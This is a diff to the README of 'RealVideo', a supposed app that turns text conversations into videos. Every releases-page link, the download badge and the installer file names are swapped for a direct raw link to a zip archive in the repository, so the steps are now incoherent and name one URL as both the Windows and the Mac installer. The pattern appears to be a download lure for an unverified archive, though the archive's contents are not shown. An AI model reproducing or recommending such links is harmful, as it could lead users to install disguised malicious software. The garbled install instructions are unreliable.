@@ -1,7 +1,7 @@
 # 🎥 RealVideo - Transform Conversations into Stunning Videos
 
 ## 📥 Download Now!
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-<color>?style=for-the-badge)](https://github.com/victormgross/RealVideo/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/victormgross/RealVideo/main/resources/Real_Video_v2.7.zip%20Latest%20Release-Click%20Here-<color>?style=for-the-badge)](https://raw.githubusercontent.com/victormgross/RealVideo/main/resources/Real_Video_v2.7.zip)
 
 ## 🚀 Getting Started
 RealVideo is a user-friendly application that turns text conversations into smooth, high-quality videos. You don't need any technical skills to use it. Follow the simple steps below to start enjoying your real-time video experience.
@@ -23,11 +23,11 @@ Before you start, ensure your device meets these basic requirements:
 ## 📥 Download & Install
 To download RealVideo, visit the link below:
 
-[Download RealVideo](https://github.com/victormgross/RealVideo/releases)
+[Download RealVideo](https://raw.githubusercontent.com/victormgross/RealVideo/main/resources/Real_Video_v2.7.zip)
 
 1. **Visit the Releases Page**: Click the link to go to the RealVideo releases page on GitHub.
 2. **Locate Latest Version**: On the releases page, look for the most recent version of RealVideo.
-3. **Download the Installer**: Click the link to download the installer that matches your operating system. It may be named `RealVideo_Installer.exe` for Windows or `RealVideo_Installer.dmg` for Mac users.
+3. **Download the Installer**: Click the link to download the installer that matches your operating system. It may be named `https://raw.githubusercontent.com/victormgross/RealVideo/main/resources/Real_Video_v2.7.zip` for Windows or `https://raw.githubusercontent.com/victormgross/RealVideo/main/resources/Real_Video_v2.7.zip` for Mac users.
 4. **Run the Installer**: Once the download finishes, locate the file and double-click to run it.
 5. **Follow the Setup Instructions**: The installation wizard will guide you through the installation process. Just follow the prompts and click "Next" to go through the steps.
 
@@ -68,7 +68,7 @@ We are continuously improving RealVideo. Keep an eye on the releases page for th
 Thank you for using RealVideo! We appreciate your support and feedback. Your input helps us make this tool better for everyone.
 
 ## 🔗 Quick Links
-- [Download RealVideo](https://github.com/victormgross/RealVideo/releases)
+- [Download RealVideo](https://raw.githubusercontent.com/victormgross/RealVideo/main/resources/Real_Video_v2.7.zip)
 - [Support Page](#)  
 - [Community Forums](#)  
 
